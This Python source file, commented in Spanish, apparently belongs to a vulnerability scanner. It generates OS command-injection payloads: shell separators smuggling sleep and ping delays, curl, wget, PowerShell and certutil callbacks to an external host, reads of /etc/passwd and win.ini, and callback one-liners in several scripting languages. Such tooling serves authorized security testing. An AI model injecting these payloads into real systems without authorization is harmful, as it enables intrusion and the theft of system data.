import uuid
import urllib.parse


class ReverseShellPayloadFactory:
    """
    Genera payloads de inyeccion de comandos orientados a detectar
    vulnerabilidades de reverse shell. Incluye:
    - Payloads basados en tiempo (sleep/ping) para deteccion ciega
    - Payloads con callback HTTP (curl/wget) para confirmacion OOB
    - Variantes con diferentes separadores de comandos
    - Payloads para Linux y Windows
    """

    # Separadores de comandos comunes
    SEPARATORS = [
        ";",       # Secuencial (Linux)
        "|",       # Pipe
        "||",      # OR logico
        "&",       # Background (Linux) / Secuencial (Windows)
        "&&",      # AND logico
        "\n",      # Newline
    ]

    # Wrappers de subcomando
    SUBCOMMAND_WRAPPERS = [
        "`{cmd}`",         # Backtick
        "$({cmd})",        # Subshell POSIX
    ]

    @staticmethod
    def _generate_token():
        return f"RSHELL_{uuid.uuid4().hex[:8]}"

    @classmethod
    def generate_time_based(cls, delay=5):
        """
        Genera payloads basados en tiempo para deteccion ciega.
        Si la respuesta tarda >= delay segundos, hay inyeccion de comandos.
        """
        token = cls._generate_token()
        payloads = []

        # --- Linux time-based ---
        linux_cmds = [
            f"sleep {delay}",
            f"ping -c {delay} 127.0.0.1",
        ]

        # --- Windows time-based ---
        windows_cmds = [
            f"timeout /t {delay} /nobreak",
            f"ping -n {delay + 1} 127.0.0.1",
        ]

        all_cmds = linux_cmds + windows_cmds

        for cmd in all_cmds:
            for sep in cls.SEPARATORS:
                payload = f"{sep}{cmd}"
                payloads.append((token, payload, "time_based"))

            # Subcommand wrappers (solo para Linux)
            if cmd in linux_cmds:
                for wrapper in cls.SUBCOMMAND_WRAPPERS:
                    payload = wrapper.format(cmd=cmd)
                    payloads.append((token, payload, "time_based"))

        return payloads

    @classmethod
    def generate_callback_based(cls, callback_host, callback_port):
        """
        Genera payloads que envian una peticion HTTP al callback server.
        Si el server recibe la peticion, confirma la inyeccion de comandos.
        """
        token = cls._generate_token()
        callback_url = f"http://{callback_host}:{callback_port}/callback?token={token}"
        payloads = []

        # Comandos que realizan peticiones HTTP
        http_cmds = [
            f"curl {callback_url}",
            f"wget -q -O /dev/null {callback_url}",
            f"wget {callback_url}",
            # PowerShell (Windows)
            f"powershell -c \"Invoke-WebRequest -Uri '{callback_url}'\"",
            f"certutil -urlcache -split -f \"{callback_url}\" NUL",
        ]

        for cmd in http_cmds:
            for sep in cls.SEPARATORS:
                payload = f"{sep}{cmd}"
                payloads.append((token, payload, "callback"))

            # Backtick y subshell
            for wrapper in cls.SUBCOMMAND_WRAPPERS:
                payload = wrapper.format(cmd=cmd)
                payloads.append((token, payload, "callback"))

        return payloads

    @classmethod
    def generate_error_based(cls):
        """
        Genera payloads que intentan producir errores reconocibles
        en la respuesta, confirmando que hay ejecucion de comandos.
        """
        token = cls._generate_token()
        payloads = []

        # Comandos cuya salida es reconocible
        fingerprint_cmds = [
            ("id", r"uid=\d+"),                    # Linux: uid=0(root)
            ("whoami", None),                       # Linux/Windows: username
            ("echo " + token, token),               # Echo del token
            ("cat /etc/passwd", r"root:.*:0:0:"),   # Linux passwd
            ("type C:\\Windows\\win.ini", r"\[fonts\]"),  # Windows win.ini
            ("uname -a", r"Linux|Darwin"),          # Kernel info
            ("ver", r"Microsoft Windows"),          # Windows version
        ]

        for cmd, pattern in fingerprint_cmds:
            for sep in cls.SEPARATORS:
                payload = f"{sep}{cmd}"
                payloads.append((token, payload, "error_based", cmd, pattern))

            for wrapper in cls.SUBCOMMAND_WRAPPERS:
                payload = wrapper.format(cmd=cmd)
                payloads.append((token, payload, "error_based", cmd, pattern))

        return payloads

    @classmethod
    def generate_reverse_shell_indicators(cls, callback_host, callback_port):
        """
        Genera payloads con comandos tipicos de reverse shell.
        Estos NO buscan ejecutar un shell real, sino detectar si
        la aplicacion es vulnerable al intentar una conexion saliente.
        La deteccion se confirma via callback server o time-based.
        """
        token = cls._generate_token()
        callback_url = f"http://{callback_host}:{callback_port}/callback?token={token}"
        payloads = []

        # Reverse shell patterns que generan una conexion detectable
        # Se usa el callback_host/port para deteccion, no para shell real
        reverse_patterns = [
            # Bash reverse shell (conexion a nuestro listener)
            f"bash -c 'curl {callback_url}'",
            # Python reverse shell indicator
            f"python -c \"import urllib.request; urllib.request.urlopen('{callback_url}')\"",
            f"python3 -c \"import urllib.request; urllib.request.urlopen('{callback_url}')\"",
            # Perl
            f"perl -e \"use LWP::Simple; get('{callback_url}')\"",
            # Ruby
            f"ruby -e \"require 'net/http'; Net::HTTP.get(URI('{callback_url}'))\"",
            # PHP
            f"php -r \"file_get_contents('{callback_url}');\"",
            # Node.js
            f"node -e \"require('http').get('{callback_url}')\"",
        ]

        for cmd in reverse_patterns:
            for sep in cls.SEPARATORS:
                payload = f"{sep}{cmd}"
                payloads.append((token, payload, "reverse_shell"))

        return payloads

    @classmethod
    def generate_all(cls, callback_host, callback_port, delay=5):
        """
        Genera todos los tipos de payloads combinados.
        Retorna lista de tuplas (token, payload, tipo, ...).
        """
        all_payloads = []
        all_payloads.extend(cls.generate_time_based(delay))
        all_payloads.extend(cls.generate_callback_based(callback_host, callback_port))
        all_payloads.extend(cls.generate_error_based())
        all_payloads.extend(cls.generate_reverse_shell_indicators(callback_host, callback_port))
        return all_payloads
